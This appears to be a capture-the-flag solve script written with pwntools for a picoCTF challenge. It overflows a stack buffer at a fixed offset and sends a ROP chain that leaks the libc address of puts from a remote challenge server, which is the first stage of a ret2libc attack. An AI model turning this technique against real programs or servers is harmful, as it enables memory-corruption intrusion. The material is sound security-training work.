#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

ADDRESS = "mercury.picoctf.net"
PORT = 49464

# bytes count from start of buffer until return address, found with gdb.
OVERFLOW_OFFSET = 136


def conn():
    #configure log.
    context.log_level = logging.DEBUG

    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDRESS, PORT)

    return r


def get_first_rop(puts_gots):
    # Target is to find address of puts in libc.

    rop = ROP(exe)
    # call puts with puts address, to leak address.
    rop.call('puts', [puts_gots])
    # Continure calling to do_stuff.
    #rop.call("do_stuff")

    log.debug(f"first rop is {rop.dump()}")

    ropchain = fit({OVERFLOW_OFFSET: rop})
    return ropchain


def write_rop_to_file():
    with open("output", "wb") as output_file:
        output_file.write(first_rop)


def main():
    r = conn()
    puts_gots = exe.got["puts"]
    log.info(f"putts address in got: {puts_gots}")
    first_rop = get_first_rop(puts_gots)

    r.recvuntil(b"sErVeR!\n")
    r.sendline(first_rop)
    # The next line will be the server output (useless)
    r.recvline()

    puts_address_in_libc = int.from_bytes(r.recvline(keepends=False), byteorder="little")
    log.info(f"'puts' address in libc : {hex(puts_address_in_libc)}")


if __name__ == "__main__":
    main()
